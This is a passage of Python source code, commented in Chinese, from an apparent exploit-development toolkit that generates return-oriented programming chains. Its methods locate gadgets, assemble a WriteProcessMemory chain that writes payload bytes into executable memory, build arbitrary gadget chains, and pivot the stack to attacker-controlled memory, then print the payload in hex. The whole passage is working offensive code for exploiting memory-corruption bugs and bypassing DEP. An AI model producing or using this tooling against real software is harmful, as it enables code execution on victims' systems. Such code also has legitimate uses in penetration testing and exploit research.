    def _find_pushad_ret(self, gadgets: List[Gadget]) -> Optional[Gadget]:
        """查找 PUSHAD; RET gadget"""
        for g in gadgets:
            instr = g.instructions.lower().strip()
            if instr.startswith('pushad') and 'ret' in instr:
                return g
        return None

    def _find_ret(self, gadgets: List[Gadget]) -> Optional[Gadget]:
        """查找纯 RET gadget"""
        for g in gadgets:
            instr = g.instructions.lower().strip()
            if instr == 'ret':
                return g
        return None

    def build_wpm_skeleton(self,
                           wpm_addr: int,
                           dst_addr: int,
                           src_placeholder: int = 0x41414141,
                           size_placeholder: int = 0x42424242,
                           writable_addr: int = 0x43434343) -> Tuple[bytes, Dict[str, int]]:
        """
        生成 WriteProcessMemory 骨架

        返回一个带占位符的 ROP 链，调用者可以替换占位符

        Args:
            wpm_addr: WriteProcessMemory IAT 地址
            dst_addr: 目标地址 (可执行内存)
            src_placeholder: 源地址占位符 (默认 0x41414141)
            size_placeholder: 大小占位符 (默认 0x42424242)
            writable_addr: 可写地址

        Returns:
            (ROP 链字节, 占位符偏移字典)
        """
        payload = bytearray()
        offsets = {}

        # WriteProcessMemory 地址
        payload.extend(self.pack_addr(wpm_addr))

        # 返回地址 = 目标地址
        payload.extend(self.pack_addr(dst_addr))

        # hProcess = -1
        payload.extend(self.pack_addr(0xFFFFFFFF))

        # lpBaseAddress
        payload.extend(self.pack_addr(dst_addr))

        # lpBuffer (占位符)
        offsets['src'] = len(payload)
        payload.extend(self.pack_addr(src_placeholder))

        # nSize (占位符)
        offsets['size'] = len(payload)
        payload.extend(self.pack_addr(size_placeholder))

        # lpNumberOfBytesWritten
        payload.extend(self.pack_addr(writable_addr))

        return bytes(payload), offsets

    def build_custom(self,
                     gadget_addresses: List[int],
                     args: List[int] = None) -> bytes:
        """
        构建自定义 ROP 链

        直接使用提供的 gadget 地址

        Args:
            gadget_addresses: Gadget 地址列表
            args: 每个 gadget 后的参数

        Returns:
            ROP 链字节
        """
        payload = bytearray()
        args = args or []

        for i, addr in enumerate(gadget_addresses):
            payload.extend(self.pack_addr(addr))
            if i < len(args):
                payload.extend(self.pack_addr(args[i]))

        return bytes(payload)

    def build_stack_pivot(self,
                          binary_path: str,
                          new_stack_addr: int) -> ROPChainResult:
        """
        构建栈转移 ROP 链

        将栈指针移动到攻击者控制的位置

        Args:
            binary_path: 目标二进制文件路径
            new_stack_addr: 新栈地址

        Returns:
            ROPChainResult
        """
        pivots = self.finder.find_stack_pivot(binary_path)

        if not pivots:
            return ROPChainResult(
                success=False,
                payload=b'',
                chain_type='stack_pivot',
                gadgets_used=[],
                missing_gadgets=['xchg reg, esp'],
                description='No stack pivot gadgets found',
                arch=self.arch
            )

        # 使用第一个可用的栈转移 gadget
        pivot = pivots[0]
        payload = bytearray()

        # 取决于具体的 pivot gadget，可能需要不同的设置
        # 例如: xchg eax, esp; ret 需要先设置 eax
        if 'xchg eax' in pivot.instructions.lower():
            # 需要 pop eax ; ret 来设置 eax
            pop_eax = self.finder.find_pop_reg(binary_path, 'eax')
            if pop_eax:
                payload.extend(self.pack_addr(pop_eax.address))
                payload.extend(self.pack_addr(new_stack_addr))
            payload.extend(self.pack_addr(pivot.address))

        return ROPChainResult(
            success=True,
            payload=bytes(payload),
            chain_type='stack_pivot',
            gadgets_used=[pivot],
            missing_gadgets=[],
            description=f'Stack pivot to 0x{new_stack_addr:x}',
            arch=self.arch
        )

    def print_chain(self, result: ROPChainResult) -> None:
        """打印 ROP 链信息"""
        print(f"ROP Chain: {result.chain_type}")
        print(f"Success: {result.success}")
        print(f"Size: {len(result.payload)} bytes")
        print(f"Arch: {result.arch}")

        if result.gadgets_used:
            print("\nGadgets used:")
            for g in result.gadgets_used:
                print(f"  0x{g.address:x}: {g.instructions}")

        if result.missing_gadgets:
            print("\nMissing gadgets:")
            for m in result.missing_gadgets:
                print(f"  - {m}")

        if result.payload:
            print("\nPayload (hex):")
            hex_str = result.payload.hex()
            for i in range(0, len(hex_str), 32):
                print(f"  {hex_str[i:i+32]}")
